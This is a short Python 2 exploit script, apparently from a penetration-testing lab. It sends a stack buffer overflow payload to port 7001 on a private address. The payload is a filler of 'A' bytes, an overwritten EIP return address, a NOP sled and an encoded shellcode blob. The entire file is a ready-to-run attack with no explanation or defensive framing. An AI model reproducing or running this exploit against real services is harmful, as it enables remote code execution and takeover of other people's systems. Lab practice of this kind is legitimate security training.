#!/usr/bin/python

import socket
try:
   print "\nSending evil buffer..."
   shellcode = (
"\xdb\xc4\xb8\xb2\x45\x04\x83\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x46\x13\x03\xf4\x56\xe6\x76\x04\xb0\x64"
"\x78\xf4\x41\x09\xf0\x11\x70\x09\x66\x52\x23\xb9\xec\x36\xc8"
"\x32\xa0\xa2\x5b\x36\x6d\xc5\xec\xfd\x4b\xe8\xed\xae\xa8\x6b"
"\x6e\xad\xfc\x4b\x4f\x7e\xf1\x8a\x88\x63\xf8\xde\x41\xef\xaf"
"\xce\xe6\xa5\x73\x65\xb4\x28\xf4\x9a\x0d\x4a\xd5\x0d\x05\x15"
"\xf5\xac\xca\x2d\xbc\xb6\x0f\x0b\x76\x4d\xfb\xe7\x89\x87\x35"
"\x07\x25\xe6\xf9\xfa\x37\x2f\x3d\xe5\x4d\x59\x3d\x98\x55\x9e"
"\x3f\x46\xd3\x04\xe7\x0d\x43\xe0\x19\xc1\x12\x63\x15\xae\x51"
"\x2b\x3a\x31\xb5\x40\x46\xba\x38\x86\xce\xf8\x1e\x02\x8a\x5b"
"\x3e\x13\x76\x0d\x3f\x43\xd9\xf2\xe5\x08\xf4\xe7\x97\x53\x91"
"\xc4\x95\x6b\x61\x43\xad\x18\x53\xcc\x05\xb6\xdf\x85\x83\x41"
"\x1f\xbc\x74\xdd\xde\x3f\x85\xf4\x24\x6b\xd5\x6e\x8c\x14\xbe"
"\x6e\x31\xc1\x11\x3e\x9d\xba\xd1\xee\x5d\x6b\xba\xe4\x51\x54"
"\xda\x07\xb8\xfd\x71\xf2\x2b\xc2\x2e\x8b\x01\xaa\x2c\x73\x57"
"\x90\xb8\x95\x3d\xf6\xec\x0e\xaa\x6f\xb5\xc4\x4b\x6f\x63\xa1"
"\x4c\xfb\x80\x56\x02\x0c\xec\x44\xf3\xfc\xbb\x36\x52\x02\x16"
"\x5e\x38\x91\xfd\x9e\x37\x8a\xa9\xc9\x10\x7c\xa0\x9f\x8c\x27"
"\x1a\xbd\x4c\xb1\x65\x05\x8b\x02\x6b\x84\x5e\x3e\x4f\x96\xa6"
"\xbf\xcb\xc2\x76\x96\x85\xbc\x30\x40\x64\x16\xeb\x3f\x2e\xfe"
"\x6a\x0c\xf1\x78\x73\x59\x87\x64\xc2\x34\xde\x9b\xeb\xd0\xd6"
"\xe4\x11\x41\x18\x3f\x92\x71\x53\x1d\xb3\x19\x3a\xf4\x81\x47"
"\xbd\x23\xc5\x71\x3e\xc1\xb6\x85\x5e\xa0\xb3\xc2\xd8\x59\xce"
"\x5b\x8d\x5d\x7d\x5b\x84")
   filler = "A" * 2288
   eip = "\xcf\x10\x80\x14"
   offset = "C" * 8
   nops = "\x90" * 10
   buffer = filler + eip + offset + nops + shellcode
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   s.connect(("192.168.170.10", 7001))
   s.send(buffer)
   s.close()
   print "\nDone!"
except:
   print "\nCould not connect!"
